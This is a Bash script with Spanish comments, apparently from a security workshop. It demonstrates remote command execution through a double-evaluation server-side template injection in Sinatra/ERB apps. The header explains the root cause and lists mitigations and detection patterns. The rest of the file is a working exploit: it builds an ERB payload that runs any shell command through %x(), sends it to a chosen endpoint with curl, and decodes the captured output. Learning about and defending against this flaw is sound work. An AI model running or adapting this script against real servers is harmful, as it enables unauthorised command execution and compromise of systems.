#!/bin/bash
# rce_via_ssti.sh
#
# Demostración de la técnica usada en el workshop: una Server-Side
# Template Injection (SSTI) por "doble evaluación" en una app Sinatra/ERB.
#
# RAZONAMIENTO (por qué funciona):
#   1. Un endpoint construye un mensaje interpolando directamente un
#      valor de usuario (p.ej. `email`) en un string.
#   2. Ese string se vuelve a pasar por `ERB.new(mensaje).result(binding)`
#      para "renderizar" variables dentro del propio mensaje (p.ej. para
#      permitir placeholders como el nombre del usuario).
#   3. Si el atacante controla el contenido de ese string ANTES de que se
#      evalúe como plantilla, cualquier `<%= ... %>` que incluya se
#      ejecuta como Ruby real, no como texto. ERB no distingue entre "la
#      plantilla que diseñó el desarrollador" y "un string que, por
#      casualidad, contiene sintaxis de plantilla".
#   4. Desde Ruby arbitrario, `%x(comando)` ejecuta comandos de shell con
#      los privilegios del proceso de la aplicación.
#
#   La causa raíz es tratar un string con datos de usuario como si fuera
#   código de plantilla de confianza — no una versión concreta de ERB.
#
# DETECCIÓN / MITIGACIÓN:
#   - Nunca renderizar como plantilla (ERB, Liquid, Jinja2...) un string
#     que contenga datos de entrada no confiables.
#   - Si se necesita interpolar variables en un mensaje, usar
#     sustitución simple (`gsub`, `String#%`), nunca un motor de
#     plantillas con evaluación implícita.
#   - WAF/IDS: patrones `<%=`, `${`, `{{` en parámetros de formularios
#     HTTP normales no deberían aparecer nunca ahí.
#   - Logging: un `system()`/`%x()` lanzado desde un proceso web que no
#     suele ejecutar comandos de shell es una señal fuerte de SSTI/RCE.
#
# Esta herramienta es una demostración GENÉRICA de este patrón, no un
# exploit contra un endpoint concreto: requiere que tú mismo identifiques
# el endpoint y el parámetro vulnerables en tu propio laboratorio.
# Uso exclusivo en entornos autorizados.
#
# Uso:
#   TARGET_URL=https://target.redacted:8888 \
#   ENDPOINT=/coupon PARAM=email \
#   ./rce_via_ssti.sh "id"

set -euo pipefail

usage() {
  cat <<USAGE
Uso: TARGET_URL=<url> [ENDPOINT=/coupon] [PARAM=email] $0 "<comando>"

Variables de entorno:
  TARGET_URL  URL base del objetivo, p.ej. https://target.redacted:8888 (obligatoria)
  ENDPOINT    Ruta del endpoint vulnerable (por defecto: /coupon)
  PARAM       Nombre del parámetro inyectable (por defecto: email)

Demuestra la técnica de SSTI por doble evaluación en ERB: el propio
payload genera marcadores propios para extraer la salida del comando,
sin depender del copy/HTML específico de ninguna app.

Solo para uso contra objetivos de laboratorio con autorización explícita.
USAGE
}

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage
  exit 0
fi

TARGET_URL="${TARGET_URL:?Define TARGET_URL, p.ej. https://target.redacted:8888 (usa -h para ayuda)}"
ENDPOINT="${ENDPOINT:-/coupon}"
PARAM="${PARAM:-email}"
CMD="${1:?Uso: $0 \"comando\" (usa -h para ayuda)}"

# Marcadores propios: el payload los imprime alrededor de la salida en
# Base64, así no dependemos de ningún texto fijo de la página.
START_MARK="SSTI_OUT_START"
END_MARK="SSTI_OUT_END"

PAYLOAD="<%= \"${START_MARK}\" + Base64.strict_encode64(%x((${CMD}) 2>&1)) + \"${END_MARK}\" %>"

RESPONSE=$(curl -sk -X POST "${TARGET_URL}${ENDPOINT}" \
  --data-urlencode "${PARAM}=${PAYLOAD}")

OUTPUT=$(echo "$RESPONSE" | grep -oP "(?<=${START_MARK}).*?(?=${END_MARK})" || true)

if [[ -z "$OUTPUT" ]]; then
  echo "[-] No se encontraron los marcadores en la respuesta." \
       "Verifica ENDPOINT/PARAM o si el endpoint es realmente vulnerable." >&2
  exit 1
fi

echo "$OUTPUT" | base64 -d
echo
